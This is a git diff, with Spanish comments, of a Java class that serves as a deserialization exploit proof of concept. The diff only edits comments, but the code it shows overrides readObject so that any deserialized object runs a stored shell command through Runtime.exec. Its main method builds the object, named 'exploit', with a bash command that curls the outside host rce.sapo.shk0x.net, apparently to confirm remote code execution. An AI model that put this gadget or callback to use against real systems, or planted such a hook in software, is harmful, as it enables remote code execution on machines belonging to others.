@@ -19,21 +19,19 @@ public class ShellSession implements Serializable {
         this.command = command;
     }
 
-    // Sobrescribir el método readObject para ejecutar el comando al deserializarse
+    // Sobrescribir el metodo readObject para ejecutar el comando al deserializarse
     private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
         in.defaultReadObject();
         try {
             System.out.println("Ejecutando el comando: " + String.join(" ", command));
             Process process = Runtime.getRuntime().exec(command);
 
-            // Leer e imprimir la salida del comando
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
             while ((line = reader.readLine()) != null) {
                 System.out.println(line);
             }
 
-            // Leer e imprimir el error del comando (si hay)
             BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
             while ((line = errorReader.readLine()) != null) {
                 System.err.println(line);
@@ -44,13 +42,13 @@ public class ShellSession implements Serializable {
         }
     }
 
-    // Método para serializar el objeto
+    // serializar el objeto
     private void writeObject(ObjectOutputStream out) throws IOException {
         out.defaultWriteObject();
     }
 
     public static void main(String[] args) {
-        // Comando a ejecutar como un arreglo de Strings
+        // arreglo de Strings
         String[] command = {"/bin/bash", "-c", "curl rce.sapo.shk0x.net"};
 
         ShellSession exploit = new ShellSession(command);
